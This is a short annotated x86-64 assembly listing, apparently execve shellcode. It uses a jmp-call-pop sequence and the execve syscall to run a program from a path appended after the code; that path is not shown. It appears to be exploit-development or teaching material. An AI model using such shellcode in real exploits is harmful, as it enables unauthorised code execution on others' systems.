; total: 18 bytes

bits 64

_start:
    jmp short loc_b     ; 0x00000000   2          eb0b
loc_a:
    pop rdi             ; 0x00000002   1            5f
    xor rdx, rdx        ; 0x00000003   3        4831d2
    push rdx            ; 0x00000006   1            52
    pop rsi             ; 0x00000007   1            5e
    push 0x3b           ; 0x00000008   2          6a3b  ; __NR_execve
    pop rax             ; 0x0000000a   1            58
    syscall             ; 0x0000000b   2          0f05
loc_b:
    call loc_a          ; 0x0000000d   5    e8f0ffffff